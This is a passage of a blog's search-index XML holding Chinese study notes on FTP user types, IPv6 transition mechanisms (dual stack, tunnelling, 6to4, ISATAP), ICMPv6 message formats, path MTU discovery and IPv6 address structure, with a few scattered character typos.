user)。系统本机用户。Linux系统一般不会针对实体用户进行限制，因此用户可以针对整个文件系统进行所有的工作。这是非常危险的，为禁止系统使用的账号登录，管理员可以在文件/etc/ftpusrs中设定不允许登录的账号，如root是不允许登录FTP的。</li><li>访客(Guest)。访客用户。只能进行文件传输的用户，即虚拟用户，访问服务器时仍然需要验证。</li><li>匿名者(anonymous)。对于公共性质的服务器可以提供匿名用户访问（一般服务器很少使用)，但应对其进行尽可能多的限制，包括以下一些内容。<ul><li>允许的工作指令要减少很多。</li><li>限制文件传输的数量,尽量不要允许其上传数据。</li><li>设置匿名者同时登录的最大联机数量。</li></ul></li></ul>]]></content>
      
      
      <categories>
          
          <category> 学习笔记 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IPv6过渡技术</title>
      <link href="/2022/12/24/IPv6%E8%BF%87%E6%B8%A1%E6%8A%80%E6%9C%AF/"/>
      <url>/2022/12/24/IPv6%E8%BF%87%E6%B8%A1%E6%8A%80%E6%9C%AF/</url>
      
        <content type="html"><![CDATA[<h2 id="IPv6过渡技术"><a href="#IPv6过渡技术" class="headerlink" title="IPv6过渡技术"></a>IPv6过渡技术</h2><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment"># 理解使用隧道机制实现IPv6穿越IPv4的原理</span><span class="token comment"># 掌握6to4自动隧道、ISATAP自动隧道的实现机制</span><span class="token comment"># 掌握Win 7下配置6to4路由器、ISATAP路由器的方法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>[TOC]</p><h3 id="IPv6过渡技术概述"><a href="#IPv6过渡技术概述" class="headerlink" title="IPv6过渡技术概述"></a>IPv6过渡技术概述</h3><h4 id="IPv6过渡期的特点"><a href="#IPv6过渡期的特点" class="headerlink" title="IPv6过渡期的特点"></a>IPv6过渡期的特点</h4><ul><li>协议的过渡需要在网络中的所有节点上安装和配置新的协议，并且检验所有主机和路由器都能正确运行</li><li>要实施IPv6网络，必须充分考虑现有的网络条件，充分利用现有的条件构造下一代互联网，以避免过多的浪费</li></ul><h4 id="过渡时期采用技术的选择"><a href="#过渡时期采用技术的选择" class="headerlink" title="过渡时期采用技术的选择"></a>过渡时期采用技术的选择</h4><p><strong>双栈技术(Dual Stack)</strong></p><ul><li>让IPv4和IPv6共存于同一设备和网络中(RFC 2893)，采用该技术的节点上同时运行IPv4和IPv6两套协议栈</li><li>对IPv4和IPv6提供了完全的兼容，但对于IP地址耗尽问题没有任何帮助</li></ul><p><strong>隧道技术(Tunnel)</strong></p><ul><li>可以让IPv6业务在现有IPv4基础设施上传输(RFC2473、RFC2893、RFC3056)。将IPv6分组作为无结构的数据，封装在IPv4数据报中，被IPv4网络传输</li><li>隧道分为手工配置的隧道和自动配置的隧道</li><li>它不能解决IPv6节点和IPv4节点之间的相互通信问题</li></ul><p><strong>转换(翻译)技术</strong></p><ul><li>让纯IPv6节点能够和纯IPv4节点相互通信(RFC2766)</li><li>转换网关除了要进行IPv4和IPv6地址转换之外，还要进行协议的转换和翻译。</li></ul><h3 id="兼容的地址"><a href="#兼容的地址" class="headerlink" title="兼容的地址"></a>兼容的地址</h3><ol><li>IPv4兼容地址<ul><li>格式为:0:0:0:0:0:0:w.x.y.z:w或::w.x.y.z，(其中w.x.y.z是公共IPv4地址的点缀十进制表示)，用于IPv6/IPv4节点，它使IPv4/IPv6节点可以通过IPv4网络与IPv6节点进行通信</li><li>如果IPv6通信流的目的地址是IPv4兼容地址，则IPv6通信流会被IPv4报头自动封装，并通过IPv4网络发送到目标节点</li></ul></li><li>IPv4映射地址<ul><li>格式为:0:0:0:0:0:0:FFFF:w.x.y.z或::FFFF:w.x.y.z，用于将一个IPv4-only节点表示为一个IPv6节点，它仅用于内部表示</li><li>IPv4映射地址从不用作IPv6数据包的源地址或目的地址，主要用于一些在IPv4-only节点和IPv6-only节点间进行协议转换的实现方案中</li></ul></li><li>6over4地址</li></ol><ul><li>6over4地址由一个有效的64位单播地址前缀和接口标识符::WWXX:YYZZ组成(其中WWXX:YYZZ是接口的单播IPv41地J止w.X.y.2HJS1 八长示)</li><li>当使用RFC2529中定义的自动隧道机制时，系统会将6over4地址分配给一个连接到支持多播IPv4网络结构中的IPv6节点</li></ul><ol start="4"><li>6to4地址<ul><li>6to4地址基于前缀2002:WWXX:YYZZ::/48(其中WWXX:YYZZ是公共IPv4地址w.x.y.z的冒号十六进制表示)</li><li>当使用RFC3056中定义的自动隧道机制时，6to4地址前缀用于创建站点的全球地址前缀，以及站点中的IPv6节点的全球地址</li></ul></li><li>ISATAP地址<ul><li>ISATAP(Intra-Site Automatic Tunnel Addressing Protocol)地址由一个有效的64位IPv4单播地址前缀和接口标符::5EFE:w.x.y.z所组成(其中w.x.y.z是一个接口的单播IPv4地址)</li><li>当使用RFC5214中定义的自动隧迫礼制时，系统会将使用ISATAP接口标识符的地址分配给IPv6/IPv4节点</li></ul></li></ol><h3 id="双栈技术"><a href="#双栈技术" class="headerlink" title="双栈技术"></a>双栈技术</h3><h4 id="工作原理"><a href="#工作原理" class="headerlink" title="工作原理"></a>工作原理</h4><p>即主机和路由器在同一网络接口上运行IPv4栈和IPv6栈。这样，双栈节点既可以接收和发送IPv4包和IPv6包，因而两个协议可以在同一网络中共存</p><img src="./IPv6协议结构/IPv6双栈技术示意图.png" style="zoom:67%;" /><h4 id="三种工作模式"><a href="#三种工作模式" class="headerlink" title="三种工作模式"></a>三种工作模式</h4><ul><li>只运行IPv6协议，对外呈现为IPv6节点;</li><li>只运行IPv4协议，对外呈现为IPv4节点;</li><li>同时运行IPv4协议和IPv6协议，对外呈现双栈模式。</li></ul><p>支持三种隧道模式为：不运行隧道；仅运行手工隧道；同时运行手工和自动隧道。</p><h4 id="双栈技术的特点"><a href="#双栈技术的特点" class="headerlink" title="双栈技术的特点"></a>双栈技术的特点</h4><blockquote><p>双栈技术是一切过渡技术的基础，隧道机制和翻译机制都要利用双栈节点</p></blockquote><ul><li>双栈技术应该能独立的配置IPv4和IPv6地址</li></ul><p>双栈技术的优点是互通性好，易于理解；缺点是需要给每个新的运行IPv6协议的网络设备和终端分配IPv4地址，不能解决IPv4地址短缺问题</p><h3 id="隧道技术"><a href="#隧道技术" class="headerlink" title="隧道技术"></a>隧道技术</h3><blockquote><p>隧道(Tunnel)是指将一种协议首部封装在另一种协议首部中，使得一种协议可以通过另一种协议的封装进行通信</p></blockquote><ul><li>优点在于隧道的透明性，不需要大量的IPv6专用设备和链路，可以明显的减少投资</li><li>缺点是配置麻烦，不能实现纯IPv4和纯IPv6主机之间的通信。</li></ul><h4 id="工作原理-1"><a href="#工作原理-1" class="headerlink" title="工作原理"></a>工作原理</h4><ul><li>核心思想是通过把IPv6数据报文封装入IPv4数据报文中，让现有IPv4网络成为载体以建立IPv6的通信，隧道两端的节点间数据报文的传送通过IPv4机制进行，隧道被看成一个直接连接的通道</li><li>隧道有两个端点，隧道入口点和隧道出口点。在入口点，路由器将IPv6分组封装在IPv4中，该IPv4的源地址和目的地址分别是入口和出口的IPv4地址。在出口点将IPv6分组取出转发给目的站点</li></ul><h4 id="IPv6数据包的封装步骤"><a href="#IPv6数据包的封装步骤" class="headerlink" title="IPv6数据包的封装步骤"></a>IPv6数据包的封装步骤</h4><ul><li>入口点将IPv6跳数限制减去1，并把该数据包封装进某个IPv4首部中。IPv4首部“协议”域设置为”41”，指示这个分组的净荷是一个IPv6的分组</li><li>通过隧道传输封装后的数据包，如果必要，封装后的IPv4数据包进行分段</li><li>隧道出口点接收到封装后的数据包。如果数据包被分段，出口点进行重组</li><li>出口点剥离IPv4首部，将IPv6数据包传递到目的地址</li></ul><img src="./IPv6协议结构/IPv6数据包封装.png" style="zoom:67%;" /><h4 id="隧道的实现方式"><a href="#隧道的实现方式" class="headerlink" title="隧道的实现方式"></a>隧道的实现方式</h4><ul><li><p>为了让数据通过隧道，必须知道两个端点的地址。确定入口点的是直接的因为它出现在IPv4基础结构的边界;确定隧道的出口点要复杂些</p></li><li><p>根据隧道终点地址的获得方式可将隧道分为<strong>配置隧道</strong>和<strong>自动隧道</strong>，其中配置隧道主要用于路由器到路由器</p></li><li><p>自动隧道有以下几种方式:</p><ul><li>Tunnel Brokers(RFC 3053):基于服务器的半自动隧道;</li><li>6to4(RFC 3056):路由器到路由器;</li><li>ISATAP:主机到路由器，路由器到主机，也可以主机到主机;.</li><li>6over4(RFC 2529):主机到路由器，路由器到主机;</li><li>Teredo:通过IPv4 NAT建立隧道;</li></ul></li></ul><h5 id="过渡初期"><a href="#过渡初期" class="headerlink" title="过渡初期"></a>过渡初期</h5><ul><li>使IPv6报文在IPv4网络中传输。手动隧道包括IPv6 over lPv4隧道，自动隧道包括IPv4兼容IPv6自动隧道、6to4隧道和ISATAP隧道</li></ul><h5 id="过渡后期"><a href="#过渡后期" class="headerlink" title="过渡后期"></a>过渡后期</h5><ul><li>使用IPv4 over lPv6隧道，使IPv4报文在lPv6网络中传输。</li></ul><h4 id="配置隧道"><a href="#配置隧道" class="headerlink" title="配置隧道"></a>配置隧道</h4><ul><li>需要隧道两个端点所在网络的管理员协作完成</li><li>隧道的端点地址由配置来决定，不需要为站点分配特殊的IPv6地址</li><li>适用于经常通信的IPv6站点之间</li></ul><h4 id="基本的自动隧道技术"><a href="#基本的自动隧道技术" class="headerlink" title="基本的自动隧道技术"></a>基本的自动隧道技术</h4><ul><li>自动配置的隧道<ul><li>端点地址根据分组的目的地址确定，适用于单独的主机之间或者不经常通信的站点之间。需要站点使用IPv4兼容的IPv6地址(O::IPv4/96)，且站点之间有可用的IPv4连接，每个采用这种机制的主机都需要一个IPv4地址</li><li>不能解决IPv4地址空间耗尽的问题。两个端点都必须支持双协议栈</li></ul></li></ul><h5 id="IPv4多播隧道6-over-4"><a href="#IPv4多播隧道6-over-4" class="headerlink" title="IPv4多播隧道6 over 4"></a>IPv4多播隧道6 over 4</h5><ul><li>与配置隧道不同的是它不需要任何地址配置;与自动隧道不同的是它不要求使用lIPv4兼容的IPv6地址</li><li>当通过支持6 over 4的路由器与外界相连时，站点内的主机可以和外部IPv6站点通信</li></ul><h4 id="6to4隧道"><a href="#6to4隧道" class="headerlink" title="6to4隧道"></a>6to4隧道</h4><blockquote><p>6to4是一种自动隧道机制，通常在站点的边界路由器之间建立隧道，它为IPv6站点和主机之间提供了跨IPv4 Internet的单播IPv6连通性</p></blockquote><p><strong>使用前缀为2002:IPv4addr:/48的6to4地址，其中IPv4addr是站点边界路由器的IPv4地址</strong></p><ul><li>当两个站点中任两台主机通信时，隧道首节点自动从IPv6源地址和目的地址中提取出隧道首尾节点的IPv4地址，在两个站点的边界路由器之间建立一条IPv4隧道</li></ul><p>隧道不需要维护任何信息，通信开始时建立，通信结束时自动撤销</p><h5 id="6to4路由器"><a href="#6to4路由器" class="headerlink" title="6to4路由器"></a>6to4路由器</h5><blockquote><p>6to4路由器是支持使用6to4隧道接口的IPv6/IPv4路由器，它通常用于一个站点中的6to4主机和IPv4网络(如: Internet)上的其它6to4路由器或6to4中继路由器之间转发目标为6to4地址的通信流，充当了隧道的端点</p></blockquote><p>6to4路由器应实现双栈和6to4隧道功能，并且至少有一个全球唯一的可路由IPv4地址需要使用额外的处理逻辑，以正确地封装和拆封，并且还可能需要额外的手工配置</p><h5 id="6to4中继路由器"><a href="#6to4中继路由器" class="headerlink" title="6to4中继路由器"></a>6to4中继路由器</h5><ul><li>在Internet上的6to4路由器和IPv6 Internet上的主机之间转发目标为6to4地址的通信流的IPv6/IPv4路由器</li></ul><img src="./IPv6协议结构/6to4中继路由器.png" style="zoom:67%;" /><h4 id="lSATAP隧道"><a href="#lSATAP隧道" class="headerlink" title="lSATAP隧道"></a>lSATAP隧道</h4><blockquote><p>站点内自动隧道寻址协议(Intra-Site Automatic Tunnel AddressingProtocol)，将没有IPv6路由器的IPv4内部网中的IPv6节点连接起来，为IPv6主机之间提供了<strong>跨越IPv4内部网络</strong>单播IPv6连通性</p></blockquote><ul><li>ISATAP主机使用标准地址自动配置机制来创建lSATAP地址。ISATAP地址格式为:64位前缀:5EFE: w.x.y.z。其中前缀可以是链路本地地址前缀、站点本地前缀和全球前缀(包括6to4前缀)</li></ul><img src="./IPv6协议结构/ISATAP隧道.png" style="zoom:67%;" /><h3 id="协议转换技术"><a href="#协议转换技术" class="headerlink" title="协议转换技术"></a>协议转换技术</h3><h4 id="NAT技术"><a href="#NAT技术" class="headerlink" title="NAT技术"></a>NAT技术</h4><ul><li>NAT有三种类型:静态NAT;动态NAT;网络地址端口转换NAPT</li><li>对于IPv4向IPv6过渡机制来讲，这里的内网和外网可以分别对应IPv4网络或IPv6网络</li><li>NAT网关使用一个IPv4地址池，并把这些地址和相应IPv6地址绑定在一起。不需要对终端节点做任何修改</li><li>转换技术依据转换所对应计算机网络体系结构的层次。缺点是不支持lPv6高级特性，例如端到端的安全</li></ul><h3 id="过渡机制的选择"><a href="#过渡机制的选择" class="headerlink" title="过渡机制的选择"></a>过渡机制的选择</h3><p>在现有的IPv4网络上逐步融合IPv6技术，过渡的内容包括:</p><blockquote><p>网络的过渡；主机节点的过渡；应用程序的过渡；IPv4网络与IPv6网络之间的互通；IPv6网络之间的互通</p></blockquote><h4 id="lPv6过渡时期建议采用的过渡原则"><a href="#lPv6过渡时期建议采用的过渡原则" class="headerlink" title="lPv6过渡时期建议采用的过渡原则:"></a>lPv6过渡时期建议采用的过渡原则:</h4><ul><li>能直接建立IPv6链路的情况下，使用纯IPv6路由</li><li>不能使用IPv6链路的情况下，IPv6节点间使用隧道技术</li><li>双栈的IPv4/IPv6主机和纯IPv4或纯IPv6网络的主机通信尽量不要采用协议转换，直接自动选择相应的通信协议</li><li>纯IPv6网络和纯IPv4网络主机之间的通信，使用协议转换或应用层网关，所设计的协议转换器或ALG应该尽量保证不修改原有应用</li><li>采用逐步渐进的过渡方式，以保护原有IPv4网络的投资，过渡的技术应尽可能简单，尽量保证IPv4和IPv6之间的互操作性</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ICPMv6协议基础</title>
      <link href="/2022/12/16/ICMPv6/"/>
      <url>/2022/12/16/ICMPv6/</url>
      
        <content type="html"><![CDATA[<h2 id="ICMPv6协议"><a href="#ICMPv6协议" class="headerlink" title="ICMPv6协议"></a>ICMPv6协议</h2><p>[TOC]</p><pre class="line-numbers language-Python" data-language="Python"><code class="language-Python">#掌握四种差错报文的格式及用途#掌握请求&#x2F;回显报文的格式#理解IPv6的路径MTU发现过程<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="ICMPv6协议概述"><a href="#ICMPv6协议概述" class="headerlink" title="ICMPv6协议概述"></a>ICMPv6协议概述</h3><h4 id="ICMPv6的功能"><a href="#ICMPv6的功能" class="headerlink" title="ICMPv6的功能"></a>ICMPv6的功能</h4><blockquote><p style="color:orange;">IPv6的ICMP(Internet Control Message Protocol)，属于IPv6协议的一个组成部分，IPv6网络中的每一个节点均要实现ICMPv6</p></blockquote><ul><li><p>在IPv6分组<strong>不能被正确处理</strong>时，ICMPv<strong>6向源节点报告分组在传输过程中的出错信息和通告信息</strong>，使网络中的节点可以知道网络中所传输的IPv6分组的情况，以及当前网络状态的重要信息</p></li><li><p><strong>ICMPv6报文作为IPv6分组的数据载荷</strong></p></li></ul><h4 id="lCMPv6与ICMPv4的比较"><a href="#lCMPv6与ICMPv4的比较" class="headerlink" title="lCMPv6与ICMPv4的比较"></a>lCMPv6与ICMPv4的比较</h4><blockquote><p style="color:blue;">ICMPv6与ICMPv4是两个不同的协议，两个版本的ICMP并不兼容</p></blockquote><p>ICMPv6增加的功能包括:</p><ul><li><ul><li>IGMP、ARP、RARP功能被加入到ICMPv6中。</li><li>引入了<strong>邻居发现(Neighbor Discovery)协议</strong>，实现了路由器和前缀发现、地址解析地址自动配置、下一跳地址确定、邻居可达性检测、重复地址检测、重定向等功能</li><li>ICMPv6还支持Mobile lPv6</li></ul></li></ul><h3 id="ICMPv6协议报文格式"><a href="#ICMPv6协议报文格式" class="headerlink" title="ICMPv6协议报文格式"></a>ICMPv6协议报文格式</h3><p>ICMPv6报头由其前一个报头中的下一个报头字段值58来标识。</p><img src="./IPv6协议结构/ICMPv6报文的一般格式.png" style="zoom:67%;" /><center>ICMPv6报文的一般格式</center><img src="./IPv6协议结构/携带ICMPv6分组的报文格式.png" style="zoom:50%;" /><center>携带ICMPv6分组的报文格式</center>#### 各字段含义<ul><li>类型:8位，标识ICMPv6报文的类型，决定了报文剩余部分的格式</li><li>代码:8位，取决于报文类型，在特定情况下提供更多详细的信息，标识报文类型下一层次的作用</li><li>校验和:16位，对ICMPv6首部和部分IPv6首部中数据的正确性进行检验</li><li>报文主体:对于不同的类型和代码，包含不同的数据。如果是错误报文，则可包含用来帮助故障排除的尽可能多的信息。但<strong>ICMPv6数据包的总大小不能超过IPv6的MTU的最小值1280</strong></li></ul><h3 id="ICMPv6报文类型"><a href="#ICMPv6报文类型" class="headerlink" title="ICMPv6报文类型"></a>ICMPv6报文类型</h3><h4 id="ICMPv6差错报文"><a href="#ICMPv6差错报文" class="headerlink" title="ICMPv6差错报文"></a>ICMPv6差错报文</h4><ul><li>差错报文是由目标节点或中间路由器发送的，用于报告在转发或传送IPv6数据包过程中出现的错误。在所有的ICMPv6差错报文中，8位类型字段中的最高位都为0。因此，类型字段的范围是0~127。</li></ul><h5 id="目的地址失效差错报文"><a href="#目的地址失效差错报文" class="headerlink" title="目的地址失效差错报文"></a>目的地址失效差错报文</h5><blockquote><p style="color:blue;">当数据包无法被转发到目标节点或上层协议时，路由器或目标节点发送ICMPv6目的地址失效差错报文</p></blockquote><img src="./IPv6协议结构/目的地址失效差错报文.png" style="zoom:67%;" /><img src="./IPv6协议结构/目的地址失效差错报文代码值.png" style="zoom: 80%;" /><h5 id="包过大差错报文"><a href="#包过大差错报文" class="headerlink" title="包过大差错报文"></a>包过大差错报文</h5><blockquote><p style="color:blue;">数据包无法转发是由于路由器的转发接口的链路MTU小于IPv6数据包的长度，就要发送ICMPv6包过大报文</p></blockquote><ul><li>该ICMPv6错误报文中有一个字段指出导致该问题的链路的MTU值</li></ul><img src="./IPv6协议结构/包过大差错报文.png" style="zoom:67%;" /><h5 id="超时报文"><a href="#超时报文" class="headerlink" title="超时报文"></a>超时报文</h5><ul><li>代码为0:当IPv6报头中的跳数限制字段在转发过程中减小为0时，路由器发送ICMPv6超时报文</li><li>代码为1:当目标主机的分片重组定时器超时，目标主机发送，RFC2460规定分片重组时间为60秒</li></ul><img src="./IPv6协议结构/报文超时差错报文.png" style="zoom:67%;" /><h5 id="参数问题"><a href="#参数问题" class="headerlink" title="参数问题"></a>参数问题</h5><blockquote><p>当IPv6报文或扩展报头出现错误，从而导致IPv6不能进行进一步处理时，发送该报文。该报文由路由器或者目标节点发送</p></blockquote><ul><li>代码为0表示遇到错误的报头字段</li><li>代码为1表示遇到无法识别的下一个报头类型</li><li>代码为2表示遇到无法识别的IPv6选项。</li></ul><blockquote><p style="color:blue;">指针字段指出了IPv6数据包中错误发生的位置，其值为从0开始的字节偏移量</p></blockquote><h4 id="ICMPv6信息报文"><a href="#ICMPv6信息报文" class="headerlink" title="ICMPv6信息报文"></a>ICMPv6信息报文</h4><ul><li>信息报文提供诊断功能和附加的主机功能，比如多播侦听发现(MLD）协议和邻居发现协议。在所有的ICMPv6信息报文中，8位类型字段中的最高位都为1。因此，类型字段的范围是128～255。</li></ul><img src="./IPv6协议结构/ICMPv6信息报文与差错报文.png" style="zoom: 67%;" /><h5 id="回送请求报文"><a href="#回送请求报文" class="headerlink" title="回送请求报文"></a>回送请求报文</h5><ul><li>ICMPv6回送请求报文用于发送至目标节点，以请求目标节点立即发回一个回送应答报文</li><li>发送方主机设置标识符字段和序列号字段，用于将收到的回送应答报文与发送的回送请求报文进行匹配</li></ul><img src="./IPv6协议结构/回送请求报文.png" style="zoom:67%;" /><h5 id="回送应答报文"><a href="#回送应答报文" class="headerlink" title="回送应答报文"></a>回送应答报文</h5><ul><li>ICMPv6回送应答报文用于响应接收到的ICMPv6回送请求报文</li><li>回送应答报文的标识符字段，序列号字段和数据字段的值被置为与回送请求报文中的相应字段一样的值</li></ul><img src="./IPv6协议结构/回送应答报文.png" style="zoom:67%;" /><h3 id="ICMP处理规则"><a href="#ICMP处理规则" class="headerlink" title="ICMP处理规则"></a>ICMP处理规则</h3><blockquote><p>如果节点收到一条未知类型的ICMPv6错误报文，必须把它传送给上层协议</p></blockquote><blockquote><p>如果节点收到一条未知类型的ICMPv6信息报文，必须将其丢弃</p></blockquote><p>每一个ICMPv6差错报文（类型&lt;128）在不超过最小IPv6 MTU的情况下，包括尽可能大的引起出错的包。</p><p>网络层协议把ICMPv6差错报文传送到上层协议的进程时，原包中的上层协议字段被取出，用来选择合适的上一层进程来处理错误。如果原包含有一个很大的扩展首部，那么有可能上层协议类型并没有包含在ICMPv6差错报文中。原因是为了满足最小IPv6 MTU的限制，原包被切断了。这种情况下，差错报文在任何IPv6层处理后被丢弃。</p><p>如果接收到的数据包为下列情况之一，则不发送ICMPv6差错报文:</p><pre class="line-numbers language-none"><code class="language-none">ICMPv6错误报文，一个ICMPv6重定向报文，一个发往多播地址的，链路层多播包，链路层广播包，一个源地址不能唯一确定某个单独节点的数据包<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>对上述情况，存在两个例外，即包过大报文和代码为2，表示不可识别的lPv6选项的参数问题报文。</p><h4 id="路径MTU发现"><a href="#路径MTU发现" class="headerlink" title="路径MTU发现"></a>路径MTU发现</h4><h5 id="lPv6-MTU"><a href="#lPv6-MTU" class="headerlink" title="lPv6 MTU"></a>lPv6 MTU</h5><ul><li>IPv6要求链路层的最小MTU为1280字节，建议MTU长度最小为1500字节</li><li><strong>PMTU:从源到目的节点的所有链路上最小的链路MTU</strong></li><li><strong>PMTU发现的目的是为了确保可以使用某个路径上支持的最大可能的大小来发送数据包</strong></li></ul><h5 id="路径MTU发现工作过程"><a href="#路径MTU发现工作过程" class="headerlink" title="路径MTU发现工作过程"></a>路径MTU发现工作过程</h5><ul><li>首先主机假定PMTU与第一跳链路的MTU相同，并且使用该大小发送数据包</li><li>如果该数据包对于路径中某个路由器过大，路由器丢弃该数据包并返回类型为“数据包过大”的ICMPv6消息，且该消息中包含下一跳链路的MTU大小</li><li>主机使用这个MTU来把后续的包发往同一目的地。主机发送的数据包肯定不会小于IPv6的最小MTU (1280 Bytes)</li><li>重复上述过程，直到数据包到达目的地。</li></ul><h5 id="PMTU的改变"><a href="#PMTU的改变" class="headerlink" title="PMTU的改变"></a>PMTU的改变</h5><ul><li>由于路由拓扑结构的变化，源节点和目标节点之间的路径会随着时间而改变。·路径MTU的减小，可以通过接收到的ICMPv6包过大报文被立即发现。而路径MTU的增大，则必须通过发送方的检测才能发现。根据RFC1981，发送方可以通过试图发送更长的数据包来进行检测。而这种检测应该在距离接收到ICMPv6包过大报文最少5分钟(建议取10分钟)之后进行</li></ul>]]></content>
      
      
      <categories>
          
          <category> 网络工程相关 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络协议分析 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>IPv6协议结构</title>
      <link href="/2022/12/16/IPv6%E5%8D%8F%E8%AE%AE%E7%BB%93%E6%9E%84/"/>
      <url>/2022/12/16/IPv6%E5%8D%8F%E8%AE%AE%E7%BB%93%E6%9E%84/</url>
      
        <content type="html"><![CDATA[<h2 id="网络协议分析-IPv6协议部分"><a href="#网络协议分析-IPv6协议部分" class="headerlink" title="网络协议分析    IPv6协议部分"></a>网络协议分析    IPv6协议部分</h2><p>[TOC]</p><h3 id="网络协议分析之IPv6协议基础"><a href="#网络协议分析之IPv6协议基础" class="headerlink" title="网络协议分析之IPv6协议基础"></a>网络协议分析之IPv6协议基础</h3><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token comment">#掌握IPv6协议栈的常用命令</span><span class="token comment">#掌握lPv6单播地址的使用方法</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><h4 id="IPv6的特征："><a href="#IPv6的特征：" class="headerlink" title="IPv6的特征："></a>IPv6的特征：</h4><h4 id="IPv6地址："><a href="#IPv6地址：" class="headerlink" title="IPv6地址："></a>IPv6地址：</h4><h5 id="IPv6地址空间："><a href="#IPv6地址空间：" class="headerlink" title="IPv6地址空间："></a>IPv6地址空间：</h5><img src="./IPv6协议结构/IPv6地址空间分配情况.png" style="zoom:67%;" /><center>IPv6地址空间分配情况</center>> <p style="color:blue;">IPv6地址有三种表示形式：首选地址，压缩格式和内嵌IPv4的IPv6地址格式</p><p><strong>首选格式</strong>：</p><blockquote><p>128位地址用16位边界分成8组，每个组转换成4位十六进制数用冒号分隔，称为冒号十六进制</p></blockquote><p><strong>压缩格式</strong>：</p><blockquote><p style="color:blue;">零压缩:连续为0的组可以压缩为::(双冒号)</p></blockquote><p>删除每组的前导0， 把连续的一段0压缩为:: ，在一个IPv6地址中::只能出现一次 </p><blockquote><p style="color:blue;">零压缩只能在给定地址中使用一次，不能使用零压缩来包括某个组的一部分</p></blockquote><p><strong>IPv4的IPv6地址格式：</strong></p><blockquote><p style="color:black;">在IPv4和IPv6的混合环境中，IPv6地址中的最低32位可以用于表示lPv4地址，即:X:X:X:X:X:d.d.d.d，其中X表示16进制整数，而d表示十进制整数</p></blockquote><h5 id="IPv6格式前缀-FP-Format-Prefix"><a href="#IPv6格式前缀-FP-Format-Prefix" class="headerlink" title="IPv6格式前缀(FP, Format Prefix)"></a>IPv6格式前缀(FP, Format Prefix)</h5><ul><li>类似于IPv4中的CIDR表示法，IPv6地址被分成两个部分：子网前缀和接口标识符</li><li>IPv6地址前缀格式为:IPv6地址/前缀长度<ul><li>1030:0:0:0:C9B4:FF12:48AA:1A2B/60，用于路由的前缀长度为60位。</li><li>前缀是地址的一部分，这部分或者有固定的值，或者是路由或子网的标识。64位前缀用来表示节点所在的单个子网，所有子网都有相应的64位前缀。任何少于64位的前缀,或者是一个路由前缀，或者是包含了部分IPv6地址空间的一个地址范围</li></ul></li></ul><h4 id="IPv6地址结构"><a href="#IPv6地址结构" class="headerlink" title="IPv6地址结构"></a>IPv6地址结构</h4><img src="./IPv6协议结构/IPv6地址结构.png" style="zoom:67%;" /><ul><li>全球路由前缀:识别分配给一个站点的某个特殊地址或地址范围</li><li>子网ID:用于识别站点中的某个链路，一个子网ID与一个链路相关联，也可以将多个子网ID分配给一个链路</li><li>接口ID:用于识别和指明链路上的一个接口，并且接口ID在该链路上必须是唯一的</li></ul><p><strong>接口标识的生成</strong>：由IEEE EUI - 64规范自动生成，设备随机生成，或手工配置。</p><p><strong>EUI - 64规范(Extended Unique ldentifier)</strong></p><ul><li>将48比特的MAC地址转化为64比特的接口标识，因此理论上可多达264个不同的物理接口</li><li>转换方法:在MAC地址的中间插入4位16进制数FFFE，再把从最高位开始的第7位U/L位取反（置1)</li></ul><img src="./IPv6协议结构/EUI-64规范.png" style="zoom:67%;" /><h5 id="IPv6地址的分配"><a href="#IPv6地址的分配" class="headerlink" title="IPv6地址的分配"></a>IPv6地址的分配</h5><p><strong>IPv6地址是分配给接口的，在IPv6网络中一个接口可以有一个或多个IPv6地址(单播地址、任播地址和多播地址)</strong></p><blockquote><p style="color:blue;">一个节点的每个接口都需要至少一个单播地址。同时，一个单播地址只能与一个网络接口相关联</p></blockquote><h5 id="IPv6地址类别"><a href="#IPv6地址类别" class="headerlink" title="IPv6地址类别"></a>IPv6地址类别</h5><p>**单播地址(Unicast Address)**：用来标识单一网络接口。送往一个单播地址的包将被传送至该地址标识的接口上。</p><p>**组播地址(Multicast Address)**：用来标识一组网络接口(通常属于不同的节点)。送往一个组播地址的包将被传送至有该地址标识的所有接口上。<br>**任播（泛播）地址(Anycast Address)**：用来标识一组网络接口。送往泛播地址的包将被传送至该地址标识的接口之一(路由距离“最近”的接口)。它是IPv6引入的新的地址类型。</p><h4 id="单播地址"><a href="#单播地址" class="headerlink" title="单播地址"></a>单播地址</h4><blockquote><p style="color:orange;">单播地址包括全球单播地址、链路本地地址、站点本地地址、特殊地址、兼容地址、NSAP地址</p></blockquote><h5 id="可聚类全球单播地址"><a href="#可聚类全球单播地址" class="headerlink" title="可聚类全球单播地址"></a>可聚类全球单播地址</h5><p>相当于IPv4公共地址，有3个部分:</p><ul><li><p>ISP分配的前缀</p></li><li><p>站点拓扑，组织机构使用ISP分配的一个<strong>48位前缀</strong>，可以用前缀的49—64位共16位把网络划分为子网，最多可以划分65535个子网</p></li><li><p>接口ID:低64位用于标识接口</p></li></ul><p><strong>全球单播地址报文格式：</strong></p><ul><li>FP字段:格式前缀，3位，目前值为”001”，标识这是可集聚全球单播地址</li><li>TLAID字段:顶级集聚标识符，13位，包含最高级地址选路信息，即网络互连中最大的选路信息，可得到最大8192个不同的顶级路由</li><li>RES字段:8位，保留。最终可能会用于扩展顶级或下一级集聚标识符字段。</li><li>NLAID字段:下一级集聚标识符，24位，该标识符被一些机构用于控制顶级集聚以安排地址空间，这些机构能按照他们自己的寻址分级结构来将此24位字段切开用</li><li>SLAID字段:站点级集聚标识符，16位，获得48位前缀的组织机构用来安排内部网络结构，若字段全部用作平面地址空间，则最多可有65535个不同子网</li><li>接口标识符字段:64位，IEEE EUI-64接口标识符</li></ul><img src="./IPv6协议结构/全球单播地址报文格式.png"  /><h5 id="链路本地地址-Link-local"><a href="#链路本地地址-Link-local" class="headerlink" 